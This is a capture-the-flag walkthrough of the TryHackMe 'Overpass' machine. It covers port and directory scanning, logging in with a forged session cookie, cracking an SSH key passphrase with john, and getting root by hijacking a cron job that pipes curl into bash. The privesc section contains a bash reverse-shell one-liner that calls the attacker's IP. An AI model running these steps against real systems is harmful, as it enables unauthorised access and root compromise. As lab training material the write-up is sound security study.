---
title: "Overpass - 3 Boxes"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "rsa", "aes", "des", "ecdsa", "gcd", "cbc", "xxe", "golang", "privesc", "nmap", "gobuster", "ed25519", "reverse-shell", "wordlists"]
summary: "nmap -sC -sV 10.10.128.87 -oN init.nmap"
source:
  name: "Adamkadaban/CTFs"
  url: "https://github.com/Adamkadaban/CTFs/blob/ea683463e77d8867fb31dae4cb4fa6dd3da68852/3.Boxes/TryHackMe/Overpass/README.md"
ctf:
  name: "3 Boxes"
  challenge: "Overpass"
---

## Source

- **CTF:** 3 Boxes
- **Challenge:** Overpass
- **Repository:** [Adamkadaban/CTFs](https://github.com/Adamkadaban/CTFs)
- **File:** <https://github.com/Adamkadaban/CTFs/blob/ea683463e77d8867fb31dae4cb4fa6dd3da68852/3.Boxes/TryHackMe/Overpass/README.md>

---
### IP
`10.10.128.87`


# Recon
### nmap
`nmap -sC -sV 10.10.128.87 -oN init.nmap`
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 20:21 EDT
Nmap scan report for 10.10.128.87
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.95 seconds
```

### gobuster
`gobuster dir -u http://10.10.128.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx`
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.128.87/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/27 20:22:28 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
/admin                (Status: 301) [Size: 42] [--> /admin/]  
/css                  (Status: 301) [Size: 0] [--> css/]      
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]  
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]   
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
Progress: 107879 / 220561 (48.91%)                                                                    
===============================================================
2021/03/27 20:47:54 Finished
===============================================================
```
* `/admin` has a login page

# Web
### Cookies
* Looking at the page source, there is a `login.js` script:
```javascript
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
* In the `login()` function, we can see that if the login response is `"Incorrect credentials"`, we don't get logged in.
	* However, if it is correct, the `SessionToken` is set to the status. 
	* Thus, we can deduce that creating a cookie called `SessionToken` and setting the value to `Correct credentials` will log us in.
		* Doing this in the `Application > Cookie` tab in Chrome (or the `EditThisCookie` extension), we can log in.

* Once we make the fake cookie, we see the following on the page:
```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

[REDACTED-PRIVATE-KEY-BLOCK]
```

# SSH
* This has a password. We can crack it with john

### John
* `ssh2john key > key.john` gives us a crackable hash
* Then we can crack it with `john key.john --worlist=/usr/share/wordlists/rockyou.txt`
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (key)
```

* Now we can now change the key permissions with `chmod 600 key` and  log in with `ssh james@10.10.128.87 -i key` (the username was a guess)

* `cat user.txt` gives us the user flag: `thm{65c1aaf000506e56996822c6281e6bf7}`


# Privesc
### Linpeas
* We can run `python3 -m http.server 80` locally and `wget http://10.6.35.105/linpeas.sh` remotely to download linpeas
	* When we run it, we can see a cronjob that runs a bash script as root every minute:
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

* Because it is looking at `overpass.thm` instead of an actual ip, we can edit `/etc/hosts` to have our ip instead of `127.0.0.1`:
`/etc/hosts/`
```
10.6.36.105 overpass.thm
```

* Now, we can create the files and directories locally and make the script that runs a reverse shell:
`/downloads/src/buildscript.sh`
```
bash -i >& /dev/tcp/10.6.36.105/1337 0>&1
```
* We can host this on our system with `python3 -m http.server 80` and set up a listener with `nc -lvnp 1337`
	* After about a minute, we get a reverse shell as root

* `cat root.txt` gets the root flag: `thm{7f336f8c359dbac18d54fdd64ea753bb}`
